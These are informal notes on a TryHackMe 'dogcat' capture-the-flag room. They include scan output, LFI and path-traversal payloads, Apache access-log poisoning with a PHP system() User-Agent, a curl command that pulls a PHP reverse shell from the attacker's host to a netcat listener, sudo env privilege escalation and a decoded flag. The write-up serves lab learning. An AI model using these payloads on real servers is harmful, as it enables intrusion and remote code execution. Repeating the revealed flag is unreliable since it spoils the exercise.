                           dogcat
                    ======================
I made a website where you can look at pictures of dogs and/or cats
! Exploit a PHP application via LFI and break out of a docker 
container.					

https://tryhackme.com/hacktivities/search
 
https://tryhackme.com/room/dogcat
 
          walkthrough video (John Hammond)
                       ==============
https://www.youtube.com/watch?v=u_uuk7FWWF4&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&index=6
   
export IP=10.10.15.63
ping $IP
 
  
---------------    nmap      -------------------  Network Scanning
nmap -sC -sV -oN  map.txt $IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

The classic ports 22 & 80.  
------------------ nikto ----------------------
nikto -h http://$ip

+ /: Retrieved x-powered-by header: PHP/7.4.3.
+ /: The anti-clickjacking X-Frame-Options header is not present.  
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. 

-------------------
 HP 7.4.3 rings a bell to me as having a vulnerability, and a quick google confirms this

Let’s use gobuster to find some additional subdirectories:

------------- gobuster-------------------
gobuster dir -u http://$ip  -w  /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php, html,txt -t 60
    -
 

    dir to specify the scan should be done against directories and files
    -u to specify the target URL
    -w to specify the word list to use
    -x to specify the extensions to enumerate
    -t to specify the number of concurrent threads


/.                    (Status: 200) [Size: 418]
/index.php            (Status: 200) [Size: 418]
/cat.php              (Status: 200) [Size: 26]
/dogs                 (Status: 301) [Size: 313] [--> http://10.10.157.124/dogs/]
/cats                 (Status: 301) [Size: 313] [--> http://10.10.157.124/cats/]
/dog.php              (Status: 200) [Size: 26]
/flag.php             (Status: 200) [Size: 0]




sorce code of http://$ip

we sould notice the commands :
   <img src="cats/4.jpg">
accessing /cats is forbidden — but using the format we found in the source code,

 /cats/4.jpg gives us access. This could be crucial for if we find a way to upload a file.

lets try http://$IP/?view=dogs
 output:
  Warning: include(dogs.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

 Warning: include(): Failed opening 'dogs.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on 

    We gain following info:
-------------
  1     We are currently in the /var/www/html/ directory.
        to get to the root dir 'cd ../../../'
  2     We are currently accessing index.php and trying to include another file.
  3     It appends .php to the parameter value: dogs => dogs.php.

Appending .php means we are limited to read PHP files.
The only PHP files we sure exist are index.php, dog.php, and cat.php.
       so the path to index.php from the current directory is:
         	   /../../../../index.php
Reading index.php will be useful because we can understand the PHP code used behind the scenes.


we can assume when we searching ?view=dog ,a file dog.php is executing to send random dogs pictures to the client

At this point, I considered attempting to include index.php itself:

http://dogcat.thm/?view=dog/../../../../index

But since PHP files are executed on the server side, their source code isn’t displayed in the browser.
 Instead, the server simply runs the code and returns the output, so including a PHP file like index.php won’t reveal its contents directly.

To bypass the issue of PHP files being executed instead of displayed, we can use a trick involving PHP stream wrappers. PHP provides special wrappers that alter how files are read. One such wrapper is:
                   php://filter


This allows us to apply filters to a file’s content before it’s processed. 
By using the convert.base64 encode filter, we can encode the raw source code of a file in Base64 effectively allowing us to view the code instead of executing it.

For example, to read the contents of index.php, we could use the following payload:

?view=php://filter/read=convert.base64-encode/resource=index

However, due to the restriction that only allows dog or cat as input, we need to include a valid directory prefix in the path. So, I modified the payload as follows:
?view=php://filter/convert.base64-encode/resource=dog/../index


This successfully returned:
a very log string which is the base64 of the php code.
we will translate it using the command

echo  $STR | base64 -d
output 

the page part of the source code    'index.php'     is :

 <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php'; // add  the .php extension 
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>


The code checks if the view parameter contains "dog" or "cat" and includes the corresponding file. Additionally, the script allows clients to specify a custom file extension via the ext parameter. If the ext parameter is not provided, the script defaults to appending .php to the included file. This introduces the possibility of including files with different extensions, making it a potential attack vector for exploiting Local File Inclusion (LFI) vulnerabilities.

Now that we understand how the application works, we can manipulate the parameters to request files with different extensions. For example, we can query:

    ?view=dog&ext=.txt to include dog.txt
    ?view=dog&ext=.py to include dog.py
    ?view=dog&ext= to include dog with no extension, etc.

To exploit this for Local File Inclusion (LFI), we can upgrade our payload to bypass the default .php extension. By using path traversal and the ext parameter, we can craft the following request to read the /etc/passwd file:

?view=dog/../../../../../../../etc/passwd&ext=


LFI = Local File Includes 
https://apt2002.medium.com/tryhackme-dogcat-ctf-detailed-walkthrough-cd746fd232ef



https://youtu.be/u_uuk7FWWF4?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=355
 
passward file 
http://IP/?view=dog/../../../../../../etc/passwd&ext=
http://IP/?view=dog/../../../../../../etc/pam.conf&ext=
access.log file
http://10.10.15.63/?view=dog/../../../../../../var/log/apache2/access.log&ext=
http://10.82.177.61/?view=dog/../../../../../../var/log/apache2/access.log&ext&c=id
flag file
?view=php://filter/read=convert.base64-encode/resource=dog/../flag


 To Download the main page run :
 curl "IP" -H  "User-Agent: <?php system(\$_GET['c']);?>"

if we will add the commmand bash-c "echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaa" to URL
like this 
http://IP/?view=dog/../../../../../../var/log/apache2/access.log&ext&c=bash-c "echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 
 we will see the the next line in the page :
  0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 192.168.128.47 - - [22/Nov/2025:10:23:05 +0000] "GET /?view=dog/../../../../../../var/log/apache2/access.log&ext&c=bash-c%20%22echo%20aaaaaaaaaaaaaaaaaaaaaaaaaaaaa%22 HTTP/1.1" 200 1602 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 127.0.0.1 - - [22/Nov/2025:10:23:19 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [22/Nov/2025:10:23:50 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
 
 
I used the default PHP reverse shell available Linux in and as /usr/share/laudanum/php/php-reverse-shell.php 
  and rename it as 'shell.php' after copying it into the folder where I was working on. 
  AT the start of 'shell.php' make this  two changes:     
  
    $ip = '192.168.128.59';  // CHANGE THIS to  tun0:IP
    $port = 9999;   // Chose unused port number
   
 
open a new terminal and run:  
        sudo python3 -m http.server 80
 
open new terminal 
  to listen for incoming connection on the port we defined in the php shell on our machine:
   run:  nc   -lvnp  9999
  

   in fire fox run: 
 http://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=curl -o shell.php {TUN0}:8000/shell.php
 
 This will Download the shell.php from out mechine to the addres we are attacking.

so now the shell.php file si on that address.
to ran the shall.php run: http://$IP/shall.php 

move to the listner terminal an you can run commands
 
 
 Getting Root

Let’s just run some code to see if there are some SUIDs we can run:

1 sudo -l

output:
   Matching ......:
   ......
    User root may run the following commands on 0c65eb66c5b1:
    (ALL : ALL) ALL

As you can see we can run /usr/bin/env with no password.
sudo env  /bin/sh


https://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/



1. What is flag 1?
 
 flag file
http://IP/?view=php://filter/read=convert.base64-encode/resource=dog/../flag
copy the base64 string 
run :

echo  PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo | base64 -d

output: <?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"



 https://youtu.be/u_uuk7FWWF4?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=853

https://fnginfosec.github.io/tryhackme/2020/07/22/dogcat.html


 
 
 http://10.80.139.226/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=curl -o shell.php 192.168.128.59:9999/shell.php
 
 


